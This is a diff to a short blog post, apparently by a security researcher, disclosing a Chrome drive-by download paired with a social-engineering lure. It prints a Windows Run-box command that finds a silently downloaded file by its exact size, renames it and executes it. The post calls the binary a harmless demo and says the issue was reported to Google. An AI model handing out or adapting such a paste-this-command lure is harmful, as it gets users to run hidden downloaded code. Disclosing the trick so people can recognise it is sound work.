@@ -4,12 +4,15 @@ title: Don't run commands you don't really understand
 comments: true
 ---
 
-This demonstrates a fully silent drive-by download in Google Chrome -
-  and will launch a demo PoC if this seemingly harmless command is entered in a **Win+R** prompt:
+This demonstrates a fully silent drive-by download in Google Chrome, as well as a social engineering component:
+a PoC binary will execute if this seemingly harmless command is entered in a **Win+R** prompt on a Windows system
+(you may need to wait for a few seconds before the fun starts):
 
 <pre>
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
 </pre>
+
+<IMG src=https://i.imgur.com/jgmi7XN.png>
 
 Can you figure out how this works?
 
@@ -18,8 +21,8 @@ Can you figure out how this works?
 
 Notes: 
 
-  * The PoC is a harmless demo
-  * Chiptune in PoC is (c) 1999 Jozz
+  * The PoC binary is a 100% harmless demo  
+  * The chiptune in the PoC is (c) 1999 Jozz
   * Reported to Google in November 2015 (status: Wontfix)
 
 <A href=https://twitter.com/hexatomium>Follow</A> @hexatomium
